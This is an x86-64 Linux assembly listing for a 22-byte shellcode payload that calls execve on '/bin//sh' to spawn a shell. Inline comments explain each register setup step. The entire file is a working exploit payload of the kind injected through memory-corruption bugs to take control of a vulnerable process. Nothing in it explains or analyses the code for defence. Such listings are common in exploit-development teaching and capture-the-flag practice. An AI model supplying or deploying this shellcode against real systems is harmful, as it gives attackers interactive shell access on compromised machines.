; 22 byte execve("/bin//sh", 0, 0) for linux/x86-64

    bits 64
    
    push    59
    pop     rax    ; eax = 59
    cdq            ; edx = 0 
    push    rdx    ; NULL
    pop     rsi    ; esi = NULL
    mov     rcx, '/bin//sh'
    push    rdx    ; 0
    push    rcx    ; "/bin//sh"
    push    rsp
    pop     rdi    ; rdi="/bin//sh",0
    syscall
